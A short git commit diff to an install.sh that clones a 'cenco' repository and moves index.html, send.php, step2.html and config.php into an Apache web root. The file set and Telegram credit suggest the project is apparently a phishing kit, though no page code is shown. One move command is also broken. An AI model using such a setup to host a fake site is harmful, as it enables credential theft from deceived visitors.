1710c70380f7125262650092a97ae2d22ac4849e
RESEKK <103382307+resekk-vps@users.noreply.github.com>
2022-06-03 20:57:34 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,7 +3,6 @@
 # Created by: @K41S3RR - https://t.me/K41S3RR
 #
 # ==============================================
-cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/cenco
 cd /var/www/cenco; mv index_files /var/www; mv install.sh /var/www; mv config.php /var/www; mv index.html /var/www; mv send.php /var/www; step2.html /var/www
 cd /var/www; nano config.php
